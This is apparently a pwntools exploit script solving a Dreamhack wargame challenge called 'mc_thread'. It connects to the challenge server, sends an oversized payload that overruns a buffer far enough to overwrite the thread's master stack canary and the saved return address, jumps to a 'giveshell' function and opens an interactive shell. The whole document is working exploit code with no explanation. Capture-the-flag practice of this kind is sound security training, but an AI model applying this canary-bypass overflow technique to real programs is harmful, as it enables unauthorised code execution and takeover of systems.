from pwn import *

p = remote("host1.dreamhack.games", 16231)
# p = process("./mc_thread")
e = ELF("./mc_thread")

# gdb.attach(p)

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

buf2Mcanary = 0x2000
# buf2Mcanary = 0x8e8
# buf2canary = 0x100
# buf2ret = 0x108
buf2canary = 0x108
buf2ret = 0x118

giveshell = e.symbols["giveshell"]
slog("giveshell", giveshell)

payload = b"A"*buf2canary
payload += b"A"*8
payload += b"A"*8
payload += p64(giveshell)
payload += b"A"*(buf2Mcanary-buf2ret+8)

p.sendlineafter("Size: ",str(buf2Mcanary+0x10))
p.sendafter("Data: ",payload)
sleep(1)
p.interactive()